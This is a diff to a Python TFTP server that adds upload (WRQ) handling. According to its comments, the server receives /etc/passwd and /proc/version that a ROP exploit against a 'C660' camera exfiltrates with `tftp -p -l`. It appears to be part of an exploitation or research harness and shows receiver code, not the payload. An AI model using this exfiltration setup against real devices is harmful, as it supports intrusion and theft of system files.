@@ -29,7 +29,48 @@ def main() -> int:
 
     while True:
         data, peer = srv.recvfrom(2048)
-        if len(data) < 4 or struct.unpack(">H", data[:2])[0] != RRQ:
+        if len(data) < 4 or struct.unpack(">H", data[:2])[0] not in (RRQ, 2):
+            # opcode 2 = WRQ (camera uploads); RRQ = 1. The original filter only
+            # accepted RRQ and silently dropped every WRQ — the C660 exfil path
+            # (`tftp -p -l`) never had a receiver (measured 2026-11-05).
+            continue
+        # WRQ (opcode 2): the C660 ROP payload exfils /etc/passwd and /proc/version with
+        # `tftp -p -l <file> <host>` — the old read-only server silently dropped every
+        # upload, so system() execution on the camera had no observable ground truth.
+        if struct.unpack(">H", data[:2])[0] == DATA and len(data) >= 4:
+            continue  # stray DATA on port 69 without a WRQ handshake: ignore
+        if data[:2] == bytes([0, 2]):
+            name = data[2:].split(b"\x00")[0].decode(errors="replace")
+            safe = os.path.basename(name).replace("..", "_")
+            path = os.path.join(a.dir, safe)
+            print(f"WRQ {name} from {peer} -> {path}", flush=True)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            if a.bind != "0.0.0.0":
+                sock.bind((a.bind, 0))
+            sock.settimeout(3)
+            # ACK the WRQ (block 0) to start the upload
+            sock.sendto(struct.pack(">HH", ACK, 0), peer)
+            expected = 1
+            blob = bytearray()
+            while True:
+                try:
+                    d, _ = sock.recvfrom(2048)
+                except socket.timeout:
+                    break
+                if len(d) >= 4 and struct.unpack(">H", d[:2])[0] == DATA:
+                    blk = struct.unpack(">H", d[2:4])[0]
+                    if blk == expected:
+                        blob += d[4:]
+                        sock.sendto(struct.pack(">HH", ACK, blk), peer)
+                        expected += 1
+                        if len(d) < 516:
+                            break
+                    elif blk < expected:
+                        sock.sendto(struct.pack(">HH", ACK, blk), peer)  # dup ACK
+            if blob:
+                open(path, "wb").write(blob)
+                print(f"  received {len(blob)}B -> {path}", flush=True)
+            sock.close()
             continue
         name = data[2:].split(b"\x00")[0].decode(errors="replace")
         path = os.path.join(a.dir, os.path.basename(name))
